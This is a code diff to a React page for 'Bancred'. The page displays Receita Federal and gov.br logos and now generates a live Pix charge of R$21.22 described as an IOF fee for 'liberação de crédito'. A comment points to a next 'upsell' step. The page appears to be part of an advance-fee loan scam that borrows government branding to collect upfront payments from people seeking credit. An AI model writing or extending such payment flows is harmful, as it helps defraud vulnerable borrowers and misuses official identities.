@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useState } from "react";
+import { useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import {
   Landmark,
@@ -16,6 +16,7 @@ import {
 import logo from "@/assets/bancred-logo.png";
 import receitaLogo from "@/assets/receita-federal-logo.svg";
 import govbrLogo from "@/assets/govbr-logo.png";
+import { useParadisePix } from "@/hooks/useParadisePix";
 
 const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -45,32 +46,43 @@ const Up1 = () => {
   const valorIOF = 21.22;
 
   const [showPix, setShowPix] = useState(false);
-  const [pixLoading, setPixLoading] = useState(true);
   const [copied, setCopied] = useState(false);
 
-  useEffect(() => {
-    if (showPix) {
-      setPixLoading(true);
-      const t = setTimeout(() => setPixLoading(false), 2200);
-      return () => clearTimeout(t);
-    }
-  }, [showPix]);
+  const { create, reset, pix, loading: pixLoading, error: pixError } = useParadisePix(() => {
+    // Próximo upsell (a definir): por enquanto continua na mesma tela
+    // navigate(`/up2?${params.toString()}`);
+  });
 
-  const handleCopy = async () => {
+  const openPix = async () => {
+    setShowPix(true);
     try {
-      await navigator.clipboard.writeText(PIX_PAYLOAD);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2200);
+      await create({
+        amountCents: Math.round(valorIOF * 100),
+        description: `IOF Bancred - Liberação de crédito`,
+        stage: "iof",
+        customer: nomeRaw ? { name: nomeRaw } : undefined,
+      });
     } catch {
-      // ignore
+      /* erro tratado pelo hook */
     }
   };
 
-  const qrUrl = useMemo(
-    () =>
-      `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(PIX_PAYLOAD)}`,
-    []
-  );
+  const closePix = () => {
+    setShowPix(false);
+    reset();
+    setCopied(false);
+  };
+
+  const handleCopy = async () => {
+    if (!pix?.qr_code) return;
+    try {
+      await navigator.clipboard.writeText(pix.qr_code);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2200);
+    } catch {
+      /* ignore */
+    }
+  };
 
   return (
     <div
